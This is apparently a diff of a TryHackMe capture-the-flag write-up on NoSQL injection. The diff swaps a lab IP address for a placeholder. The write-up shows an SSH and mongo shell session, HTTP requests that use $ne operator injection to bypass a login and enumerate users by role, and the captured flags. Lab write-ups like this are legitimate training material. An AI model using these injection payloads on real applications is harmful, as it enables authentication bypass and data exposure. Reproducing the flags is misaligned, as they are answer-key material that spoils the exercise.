@@ -4,8 +4,8 @@
 
 ## Interact with the MongoDB server to find the flag. What is the flag?
 ```bash
-$ ssh thm@10.10.51.12 -p 2222
-thm@10.10.51.12 password: tryhackme
+$ ssh thm@<MACHINE_IP> -p 2222
+thm@<MACHINE_IP> password: tryhackme
 thm@mongo-server:~$ mongo
 > show databases
 admin   0.000GB
@@ -26,15 +26,15 @@ switched to db flagdb
 * Modified request:
 ```http
 POST /login HTTP/1.1
-Host: 10.10.51.12
+Host: <MACHINE_IP>
 Content-Length: 29
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://10.10.51.12
+Origin: http://<MACHINE_IP>
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://10.10.51.12/login
+Referer: http://<MACHINE_IP>/login
 Accept-Encoding: gzip, deflate
 Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
 Cookie: connect.sid=s%3An5mfgw2iQV38JdLhHGhJi9pqIuZWZ59L.Ea2JWiFK6QK08nqlNsYtS1tLoWiTsDwq8jQIL5b3CsA
@@ -42,18 +42,18 @@ Connection: close
 
 username=admin&password[$ne]=password
 ```
-* `http://10.10.51.12/flag`
+* `http://<MACHINE_IP>/flag`
 
 **Flag**: `THM{b6b304f5d5834a4d089b570840b467a8}`
 ## Once you are logged in, use the gift search page to list all usernames that have `guest` roles. What is the flag?
 * Modified request:
 ```http
 GET /search?username[$ne]=admin&role=guest HTTP/1.1
-Host: 10.10.51.12
+Host: <MACHINE_IP>
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://10.10.51.12/search
+Referer: http://<MACHINE_IP>/search
 Accept-Encoding: gzip, deflate
 Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
 Cookie: connect.sid=s%3An5mfgw2iQV38JdLhHGhJi9pqIuZWZ59L.Ea2JWiFK6QK08nqlNsYtS1tLoWiTsDwq8jQIL5b3CsA
@@ -65,11 +65,11 @@ Connection: close
 * Modified request:
 ```http
 GET /search?username=mcskidy&role[$ne]=user HTTP/1.1
-Host: 10.10.51.12
+Host: <MACHINE_IP>
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://10.10.51.12/search?username=mcskidy&role=user
+Referer: http://<MACHINE_IP>/search?username=mcskidy&role=user
 Accept-Encoding: gzip, deflate
 Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
 Cookie: connect.sid=s%3An5mfgw2iQV38JdLhHGhJi9pqIuZWZ59L.Ea2JWiFK6QK08nqlNsYtS1tLoWiTsDwq8jQIL5b3CsA
